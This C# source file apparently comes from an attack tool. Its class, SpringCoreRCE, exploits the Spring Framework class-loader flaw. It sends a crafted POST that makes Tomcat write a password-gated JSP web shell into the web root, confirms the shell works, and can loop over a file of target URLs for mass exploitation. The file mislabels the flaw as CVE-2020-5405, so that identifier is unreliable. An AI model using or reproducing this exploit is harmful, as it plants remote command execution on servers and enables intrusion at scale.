using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Linq;

namespace OelianderUI.Helpers.Exploits
{

    public class SpringCoreRCE
    {
        /// <summary>
        /// Spring Core RCE (CVE-2020-5405)
        /// </summary>

        private static readonly HttpClient client = new HttpClient();
        private static readonly string data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";

        internal static readonly string banner = @"
   ______     _______     ____   ___ ____   ___       ____  _  _    ___  ____  
  / ___\ \   / / ____|   |___ \ / _ \___ \ / _ \     | ___|| || |  / _ \| ___| 
 | |    \ \ / /|  _| _____ __) | | | |__) | | | |____|___ \| || |_| | | |___ \ 
 | |___  \ V / | |__|_____/ __/| |_| / __/| |_| |_____|__) |__   _| |_| |___) |
  \____|  \_/  |_____|   |_____|\___/_____|\___/     |____/   |_|  \___/|____/ 
                                 SpringCoreRCE
";
        // Exploit function that sends the payload and checks for the shell
        public static async Task Exploit(string url)
        {
            try
            {
                // Set custom headers
                client.DefaultRequestHeaders.Add("suffix", "%>//");
                client.DefaultRequestHeaders.Add("c1", "Runtime");
                client.DefaultRequestHeaders.Add("c2", "<%");
                client.DefaultRequestHeaders.Add("DNT", "1");
                client.DefaultRequestHeaders.Add("Content-Type", "application/x-www-form-urlencoded");

                

                // Send the POST request
                var content = new StringContent(data, Encoding.UTF8, "application/x-www-form-urlencoded");
                var response = await client.PostAsync(url, content);

                // Construct the shell URL
                Uri shellUrl = new Uri(new Uri(url), "tomcatwar.jsp");

                // Send GET request to check for the shell
                var shellResponse = await client.GetAsync(shellUrl);
                if (shellResponse.IsSuccessStatusCode)
                {
                    Objects.ShowAlert("Vulnerability Found", $"The vulnerability exists, the shell address is:\n{shellUrl}?pwd=j&cmd=whoami", 0);
                }
            }
            catch (Exception ex)
            {
                Objects.ShowAlert("No Vuln Found", $"Error: {ex.Message}", 2);
            }
        }

        // Main method that handles arguments and file processing
        public static async Task ScanForSpringCoreRCE(string target)
        {
            if (target.EndsWith(".txt"))
            {
                try
                {
                    var lines = File.ReadAllLines(target).Select(line => line.Trim()).ToList();
                    foreach (var line in lines)
                    {
                        await Exploit(line);
                    }
                }
                catch (Exception ex)
                {
                    Objects.ShowAlert("TargetList Error", $"Error reading file: {ex.Message}", 2);
                }
            }
            else
                await Exploit(target);
        }
    }

}
